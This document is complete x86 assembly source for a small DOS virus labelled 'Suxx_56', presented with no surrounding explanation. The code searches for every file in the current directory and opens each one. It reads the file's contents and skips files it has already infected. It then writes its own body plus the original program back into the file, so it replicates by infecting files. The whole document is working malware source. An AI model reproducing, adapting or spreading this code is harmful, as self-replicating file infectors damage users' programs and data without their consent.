;>      [ Suxx_56 ]
        .model tiny
        .code
        .startup
s:
        db      '*.*',0         ; sub cx,[002Ah]
        xchg    ax,cx           ; cx = 0
        mov     ah,4Eh          ; find first
        mov     dx,si           ; mask
i:
        int     21h
        jb      i               ; if error => ah = 00 (Terminate Program)
        mov     ax,3D02h        ; open (r/w)
        mov     dx,9Eh          ; name of finded file

        push    ax dx

        int     21h
        xchg    bx,ax           ; bx = handle
        mov     ah,3Fh          ; read
        push    sp
        pop     cx
        shl     dx,1            ; dx = 13Ch - buffer - afta vir.body
        int     21h
        pop     dx
        add     ax,dx        ; ax = vir.size + prog.size
        xchg    ax,bx        ; bx = vir.size + prog.size
        pop     ax

        cmp     [si+3Ch+0eh],ax   ; is it me ?  3d02h
        je      f               ; yes - find next

        int     21h             ; open (r/w)
        xchg    bx,ax           ; bx = handle;  ax - vir.size + prog.size
        xchg    cx,ax        ; cx = vir.size + prog.size
        mov     dx,si           ;=100h
        mov     ah,40h
        int     21h        ; write vir.body + prog.body
f:
        mov     ah,4fh          ; find next
        jmp     i
e:
        db      'suxx'           ; dummy progg ;)))
        end
